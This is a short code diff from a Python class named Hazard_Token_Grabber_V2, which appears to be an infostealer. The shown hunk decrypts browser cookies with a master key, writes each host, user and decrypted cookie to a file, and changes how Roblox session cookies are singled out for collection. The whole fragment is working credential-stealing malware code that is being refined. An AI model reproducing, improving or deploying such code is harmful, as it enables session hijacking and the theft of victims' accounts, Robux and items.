@@ -231,7 +231,7 @@ class Hazard_Token_Grabber_V2:
                     user = r[1]
                     decrypted_cookie = self.decrypt_password(r[2], master_key)
                     if host != "": f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-                    if '.ROBLOSECURITY' in user: self.robloxcookies.append(decrypted_cookie)
+                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie: self.robloxcookies.append(decrypted_cookie)
             except Exception:
                 pass
         cursor.close()
